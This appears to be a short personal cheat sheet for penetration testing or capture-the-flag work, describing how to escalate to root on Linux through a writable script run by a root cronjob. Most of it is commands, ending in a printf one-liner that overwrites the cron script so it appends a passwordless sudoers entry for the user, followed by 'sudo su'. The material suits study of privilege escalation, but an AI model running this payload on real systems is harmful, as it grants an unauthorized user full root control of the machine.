
exploiting a cronjob that is misconfigured that runs as root


Methodology
=
1. find files used by cronjob - might just be a random binary, find where and if its used - somtimes cating crontab wont work, need to use grep
2. identify if it can be modified
3. utilize it to run a command that will grant root

Finding usage of binary
=
`grep -rnw /usr -e "/home/user/binary"` run from / will show what scripts might run the binary in a particular directory
`ls -al /directory/of/script/using/binary` - check permissions of binary

Commands
=
`groups user`
`crontab -l` - lists cronjobs of current user

Edit without shells or editors
=
`printf '#/bin/bash\necho "username ALL=NOPASSWD:ALL" >> /etc/sudoers' > /cronjob/path.sh` - add current user to sudoers `sudo -l to confirm`
`sudo su` - get root user